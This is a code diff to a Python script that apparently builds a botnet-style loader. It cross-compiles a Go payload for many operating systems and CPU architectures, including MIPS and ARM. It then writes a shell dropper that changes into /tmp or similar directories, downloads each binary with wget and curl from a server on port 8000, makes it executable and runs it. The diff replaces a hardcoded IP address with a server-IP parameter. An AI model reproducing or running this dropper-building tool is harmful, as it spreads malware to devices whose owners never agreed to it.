@@ -2,18 +2,18 @@ import os
 GOOS = ["linux","windows","freebsd","darwin"]
 GOARCH = ["amd64","arm","386","mips","mipsle","mips64","mips64le"]
 
-def compileCode(fileNme,shName):
+def compileCode(serverIp,fileNme,shName):
 
     os.system("rm -rf ./bins/*")
     os.system("rm -rf ./{}".format(shName))
-    shScript = "rm %s;cd /tmp || cd /var/run || cd /mnt || cd /root || cd / ;wget http://192.168.1.171:8000/bins/%s;curl -O http://192.168.1.171:8000/bins/%s;chmod +x *;./%s&\n"
+    shScript = "rm %s.sh;cd /tmp || cd /var/run || cd /mnt || cd /root || cd / ;wget http://%s:8000/bins/%s;curl -O http://%s:8000/bins/%s;chmod +x *;./%s\n"
     shFIle = open(shName+".sh",'w')
     for o in GOOS:
         for a in GOARCH:
             binFileNme = "{}.{}.{}".format(fileNme,o,a)
             output = os.popen('GOOS={} GOARCH={} GOMIPS=softfloat go build -ldflags "-s -w" -o ./bins/{} code.go'.format(o,a,binFileNme)).close()
             if output is None:
-                shFIle.write(shScript % (shName,binFileNme,binFileNme,binFileNme))
+                shFIle.write(shScript % (shName,serverIp,binFileNme,serverIp,binFileNme,binFileNme))
     shFIle.close()
 
 
@@ -62,5 +62,5 @@ if __name__ == "__main__":
     fileNme=input("bins name：")
     shName = input("script name：")
     createCodeFile(serverIp,serverPort)
-    compileCode(fileNme,shName)
+    compileCode(serverIp,fileNme,shName)
     os.system("rm code.go")
